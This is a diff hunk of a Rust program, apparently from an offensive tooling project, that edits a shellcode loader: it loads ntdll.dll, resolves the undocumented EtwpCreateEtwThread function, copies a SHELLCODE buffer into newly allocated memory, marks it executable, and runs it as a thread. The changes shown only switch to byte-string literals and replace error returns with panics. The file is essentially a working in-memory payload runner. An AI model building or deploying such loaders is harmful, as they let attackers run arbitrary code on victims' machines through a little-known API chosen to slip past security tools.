@@ -18,32 +18,32 @@ fn main() {
     let mut old = PAGE_READWRITE;
 
     unsafe {
-        let ntdll = LoadLibraryA("ntdll.dll\0".as_ptr());
+        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr());
         if ntdll == 0 {
-            eprintln!("LoadLibraryA failed!");
-            return;
+            panic!("LoadLibraryA failed!");
         }
 
-        let fn_etwp_create_etw_thread = GetProcAddress(ntdll, "EtwpCreateEtwThread\0".as_ptr());
+        let fn_etwp_create_etw_thread = GetProcAddress(ntdll, b"EtwpCreateEtwThread\0".as_ptr());
 
         let etwp_create_etw_thread: extern "C" fn(*mut c_void, isize) -> HANDLE =
             transmute(fn_etwp_create_etw_thread);
 
         let dest = VirtualAlloc(null(), SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if dest.is_null() {
-            eprintln!("VirtualAlloc failed!");
-            return;
+            panic!("VirtualAlloc failed!");
         }
 
         copy(SHELLCODE.as_ptr(), dest.cast(), SIZE);
 
         let res = VirtualProtect(dest, SIZE, PAGE_EXECUTE, &mut old);
         if res == FALSE {
-            eprintln!("VirtualProtect failed!");
-            return;
+            panic!("VirtualProtect failed!");
         }
 
         let thread = etwp_create_etw_thread(dest, 0);
+        if thread == 0 {
+            panic!("etwp_create_etw_thread failed!")
+        }
 
         WaitForSingleObject(thread, WAIT_FAILED);
     }
